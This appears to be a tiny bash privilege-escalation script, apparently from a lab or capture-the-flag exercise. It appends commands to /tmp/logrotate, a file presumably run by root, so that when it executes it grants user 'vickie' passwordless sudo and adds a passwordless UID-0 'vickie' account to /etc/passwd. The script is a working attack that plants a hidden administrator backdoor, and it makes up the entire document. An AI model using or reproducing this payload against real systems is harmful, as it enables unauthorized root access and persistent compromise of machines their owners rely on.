#!/bin/bash
echo "echo 'vickie ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /tmp/logrotate
echo "echo 'vickie::0:0:System Administrator:/root/root:/bin/bash' >> /etc/passwd"  >> /tmp/logrotate
